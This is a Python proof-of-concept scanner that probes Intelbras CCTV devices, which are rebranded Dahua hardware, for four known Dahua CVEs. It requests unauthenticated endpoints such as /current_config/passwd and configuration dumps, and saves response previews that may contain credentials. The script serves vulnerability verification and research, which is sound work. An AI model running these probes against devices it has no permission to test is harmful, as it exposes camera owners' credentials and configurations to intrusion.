#!/usr/bin/env python3
"""PoC INTELBRAS-2026-008: Dahua OEM Heritage — Inherited CVE Verification.

Probes Intelbras CCTV devices that are Dahua OEM rebrands for known Dahua CVEs:
- CVE-2017-7921: Authentication bypass
- CVE-2017-7927: Configuration dump without auth
- CVE-2020-25078: Username disclosure via /current_config/passwd
- CVE-2021-36260: Command injection in web interface

Author: André Henrique (@mrhenrike) | União Geek — https://github.com/Uniao-Geek
Date: 2026-04-18
CVSS: 8.1 HIGH — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:L
CWE: Multiple
"""

import os
import sys
import json
from pathlib import Path
from datetime import datetime, timezone

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False


EVIDENCE_DIR = Path(__file__).parent / ".." / "evidence"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
}

DAHUA_CHECKS = [
    {
        "cve": "CVE-2017-7921",
        "name": "Authentication Bypass",
        "cvss": 10.0,
        "method": "GET",
        "paths": [
            "/current_config/passwd",
            "/device/deviceInfo",
        ],
        "success_indicators": ["admin", "root", "password", "Username"],
    },
    {
        "cve": "CVE-2017-7927",
        "name": "Configuration Dump",
        "cvss": 7.5,
        "method": "GET",
        "paths": [
            "/cgi-bin/configManager.cgi?action=getConfig&name=Network",
            "/cgi-bin/configManager.cgi?action=getConfig&name=All",
        ],
        "success_indicators": ["table.Network", "table.All", "Address"],
    },
    {
        "cve": "CVE-2020-25078",
        "name": "Username Disclosure",
        "cvss": 7.5,
        "method": "GET",
        "paths": [
            "/current_config/passwd",
        ],
        "success_indicators": ["admin", "root", ":0:"],
    },
    {
        "cve": "CVE-2021-36260",
        "name": "Command Injection (safe check only)",
        "cvss": 9.8,
        "method": "GET",
        "paths": [
            "/cgi-bin/magicBox.cgi?action=getDeviceType",
            "/cgi-bin/magicBox.cgi?action=getSoftwareVersion",
        ],
        "success_indicators": ["DH-", "IPC-", "DVR", "NVR", "V2."],
    },
]


def check_cve(base_url: str, check: dict, timeout: int = 10) -> dict:
    result = {
        "cve": check["cve"],
        "name": check["name"],
        "cvss": check["cvss"],
        "vulnerable": False,
        "paths_tested": [],
    }

    for path in check["paths"]:
        url = base_url + path
        path_result = {
            "path": path,
            "status": None,
            "accessible": False,
            "indicators_found": [],
        }

        try:
            resp = requests.get(
                url, headers=HEADERS, timeout=timeout,
                allow_redirects=False, verify=False,
            )
            path_result["status"] = resp.status_code

            if resp.status_code == 200 and len(resp.content) > 10:
                path_result["accessible"] = True
                text = resp.text[:500]

                for indicator in check["success_indicators"]:
                    if indicator.lower() in text.lower():
                        path_result["indicators_found"].append(indicator)

                if path_result["indicators_found"]:
                    result["vulnerable"] = True
                    path_result["preview"] = text[:200]
                    print(f"  [+] {check['cve']}: VULNERABLE via {path}")
                    print(f"      Indicators: {path_result['indicators_found']}")
                else:
                    print(f"  [*] {check['cve']}: {path} accessible but no indicators")
            else:
                print(f"  [-] {check['cve']}: {path} — HTTP {resp.status_code}")

        except Exception as e:
            path_result["status"] = f"ERROR: {e}"
            print(f"  [!] {check['cve']}: {path} — {e}")

        result["paths_tested"].append(path_result)

    return result


def main():
    if not HAS_REQUESTS:
        print("[!] requests library required. Install: pip install requests")
        sys.exit(1)

    if len(sys.argv) < 2:
        print("Usage: python poc_008_dahua_oem_heritage.py <target_ip> [port]")
        print()
        print("Probes Intelbras CCTV devices (Dahua OEM) for inherited CVEs.")
        print("Safe checks only — no exploitation, just detection.")
        sys.exit(0)

    target_ip = sys.argv[1]
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 80
    base_url = f"http://{target_ip}:{port}"

    print(f"[*] Probing {target_ip}:{port} for Dahua OEM heritage CVEs...")
    print(f"[*] Testing {len(DAHUA_CHECKS)} known Dahua CVEs")
    print()

    all_results = []
    vuln_cves = []

    for check in DAHUA_CHECKS:
        result = check_cve(base_url, check)
        all_results.append(result)
        if result["vulnerable"]:
            vuln_cves.append(result["cve"])

    print(f"\n{'='*60}")
    if vuln_cves:
        print(f"[+] VULNERABLE to {len(vuln_cves)} Dahua CVE(s):")
        for cve in vuln_cves:
            print(f"    {cve}")
        print("[!] This confirms Dahua OEM heritage with unpatched vulnerabilities")
    else:
        print("[-] No Dahua CVEs confirmed (may be patched or non-Dahua OEM)")

    output = {
        "poc_id": "INTELBRAS-2026-008",
        "title": "Dahua OEM Heritage CVE Verification",
        "target": f"{target_ip}:{port}",
        "scan_date": datetime.now(timezone.utc).isoformat(),
        "vulnerable_cves": vuln_cves,
        "results": all_results,
    }

    os.makedirs(EVIDENCE_DIR, exist_ok=True)
    out_path = EVIDENCE_DIR / "poc_008_results.json"
    with open(out_path, "w", encoding="utf-8") as f:
        json.dump(output, f, indent=2, ensure_ascii=False)
    print(f"\n[+] Results saved to {out_path}")


if __name__ == "__main__":
    main()
